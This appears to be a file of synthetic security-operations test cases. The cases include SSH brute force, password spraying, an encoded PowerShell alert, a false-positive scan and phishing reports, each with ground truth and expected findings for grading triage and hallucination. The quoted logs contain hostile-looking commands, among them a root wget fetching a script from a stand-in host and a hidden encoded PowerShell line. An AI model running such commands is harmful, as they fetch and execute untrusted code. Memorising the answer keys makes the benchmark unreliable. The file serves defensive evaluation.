_readme: Synthetic SOC test cases. All IPs use documentation ranges (RFC 5737) or private ranges. expected_findings are a rough keyword screen (match: any|all); must_not_claim are words that would be unsupported by the input. The automatic score is only a first pass - the analyst's manual review is authoritative.

cases.title: Linux SSH brute force followed by successful login and suspicious download
input_lines: Oct 14 02:11:03 web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.45 port 51122 ssh2
Oct 14 02:11:05 web01 sshd[2213]: Failed password for invalid user test from 203.0.113.45 port 51124 ssh2
Oct 14 02:11:07 web01 sshd[2215]: Failed password for root from 203.0.113.45 port 51126 ssh2
Oct 14 02:11:09 web01 sshd[2217]: Failed password for root from 203.0.113.45 port 51128 ssh2
Oct 14 02:11:12 web01 sshd[2219]: Failed password for invalid user ubuntu from 203.0.113.45 port 51130 ssh2
Oct 14 02:11:15 web01 sshd[2221]: Failed password for deploy from 203.0.113.45 port 51132 ssh2
Oct 14 02:11:18 web01 sshd[2223]: Failed password for deploy from 203.0.113.45 port 51134 ssh2
Oct 14 02:12:01 web01 sshd[2230]: Accepted password for deploy from 203.0.113.45 port 51190 ssh2
Oct 14 02:12:01 web01 sshd[2230]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Oct 14 02:13:44 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.77/x.sh -O /tmp/x.sh
cases.ground_truth: Repeated failed SSH logins from 203.0.113.45 against several usernames (brute force), then a successful login for 'deploy' from the same IP, then a root-level wget download of a script from 198.51.100.77. Likely account compromise; not proven. No malware name or actor is identifiable from the logs.

expected_findings.description: Repeated failed logins from 203.0.113.45 (brute force)
Several different usernames targeted
Successful login for deploy from the same IP after the failures
sudo wget download from 198.51.100.77 (x.sh)

cases.title: Windows password spraying, successful logon, admin group change
input_lines: 2026-10-14 09:02:11 DC01 EventID=4625 Account=alice LogonType=3 SourceIP=10.20.5.99 Status=0xC000006D
2026-10-14 09:02:14 DC01 EventID=4625 Account=bob LogonType=3 SourceIP=10.20.5.99 Status=0xC000006D
2026-10-14 09:02:17 DC01 EventID=4625 Account=carol LogonType=3 SourceIP=10.20.5.99 Status=0xC000006D
2026-10-14 09:02:20 DC01 EventID=4625 Account=dave LogonType=3 SourceIP=10.20.5.99 Status=0xC000006D
2026-10-14 09:02:23 DC01 EventID=4625 Account=admin LogonType=3 SourceIP=10.20.5.99 Status=0xC000006A
2026-10-14 09:02:26 DC01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=10.20.5.99 Status=0xC000006A
2026-10-14 09:05:40 DC01 EventID=4624 Account=svc_backup LogonType=3 SourceIP=10.20.5.99
2026-10-14 09:07:02 FS02 EventID=4732 MemberAdded=svc_backup Group=Administrators ChangedBy=svc_backup
cases.ground_truth: One source (10.20.5.99) failed logons against six different accounts in about 15 seconds (password-spraying pattern), then a successful network logon for svc_backup from the same source, then svc_backup added itself to the local Administrators group on FS02 (possible privilege escalation). Whether 10.20.5.99 is a known asset is not provided.

expected_findings.description: One source failing against many accounts (password spraying)
Successful logon for svc_backup from the same source
svc_backup added to Administrators group (privilege escalation)

cases.title: Alert triage - Office spawning encoded PowerShell (likely true positive)
input_lines: ALERT: Suspicious PowerShell Execution - Encoded Command
Severity (SIEM): High
Host: WS-FIN-07
User: CORP\jdoe
Parent Process: WINWORD.EXE
Process: powershell.exe
Command Line: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... [truncated]
Follow-on event (10:41:12): Outbound TCP 443 from WS-FIN-07 to 198.51.100.23
Asset note: Finance workstation. No approved admin scripts run from Office applications.
cases.ground_truth: Word spawning a hidden, encoded PowerShell followed by an outbound connection from a finance workstation is a strong malicious indicator: likely true positive, escalate. The decoded payload is NOT available (command is truncated), and the reputation of 198.51.100.23 is not provided. No malware family can be named.

expected_findings.description: Word (Office app) spawning PowerShell is suspicious
Encoded / hidden-window PowerShell command
Outbound connection to 198.51.100.23 on 443
Verdict leans true positive / escalate
Notes decoded payload is missing / truncated

cases.title: Alert triage - authorized vulnerability scan (likely false positive)
input_lines: ALERT: Possible Port Scan Detected
Severity (SIEM): Medium
Source: 10.10.1.50 (hostname: nessus-scan01)
Destination: 10.10.2.0/24 (internal server VLAN), 1000+ distinct ports in 3 minutes
Asset inventory: nessus-scan01 is registered as the authorized vulnerability scanner (owner: IT Security)
Change calendar: Weekly vulnerability scan scheduled Tuesday 01:00-04:00
cases.ground_truth: The source is the registered, authorized scanner and the alert falls inside the scheduled scan window: likely false positive. A good answer recommends verifying the schedule and does not escalate as an incident.

expected_findings.description: Identifies likely false positive / authorized activity
Uses the scan schedule / change calendar context
Does not recommend a high-priority escalation

cases.title: Threat intelligence summary of a phishing report (hallucination trap: no attribution, no malware)
input_lines: Title: Credential Harvesting Campaign Targeting Finance Staff
Date range observed: 8-12 October 2026

Summary: Finance employees at several mid-sized companies received emails with an HTML attachment named invoice_2026.html. Opening the attachment redirects the victim to a fake Microsoft 365 login page that captures credentials. No malware was dropped on victim systems.
Indicators:
- Sender address: billing@invoices-portal[.]example
- Sender IP: 192.0.2.88
- Phishing URL: hxxps://secure-login-portal[.]example/auth
- Attachment filename: invoice_2026.html
Observed technique: Phishing with attachment (MITRE ATT&CK T1566.001)
Attribution: No attribution has been made.
Reporter recommendation: Block the listed domains and sender, enable MFA, and warn finance staff.
cases.ground_truth: IOCs: sender address, sender IP 192.0.2.88, phishing URL/domain, attachment name. Credential theft only, no malware. Attribution: not stated. T1566.001 is given in the report. Defensive actions: block, MFA, awareness. Any extra IP, CVE, hash, malware family or threat actor is a hallucination.

expected_findings.description: Extracts sender IP 192.0.2.88
Extracts phishing domain
Extracts attachment name
States no malware was dropped
States attribution is not given
Uses MITRE ID from the report (T1566.001)

cases.title: Incident report drafting from analyst facts (hallucination trap: unknowns)
input_lines: Incident ID: IR-2026-014 (draft)
Facts provided by analyst:
- 09:14 User jdoe reported a suspicious email to the SOC.
- 09:20 SOC confirmed the email contained a link to a credential phishing page.
- 09:32 Proxy logs show jdoe submitted credentials to the phishing page.
- 09:48 Mailbox audit log shows a new inbox rule on jdoe's mailbox forwarding all mail to an external address.
- 10:05 SOC reset jdoe's password and revoked active sessions.
- 10:20 SOC removed the forwarding rule.
Not known at this time: whether any forwarded email contained sensitive data, how many emails were forwarded, whether other users received the same email.
cases.ground_truth: A faithful report uses exactly the six given times, mentions the password reset and forwarding-rule removal, and lists data exposure, number of forwarded emails, and other recipients as UNKNOWN. Invented counts, data types, systems, or attacker details are hallucinations.

expected_findings.description: Timeline contains all six given times
Marks data exposure / counts as unknown
Mentions password reset and forwarding-rule removal
Includes incident ID
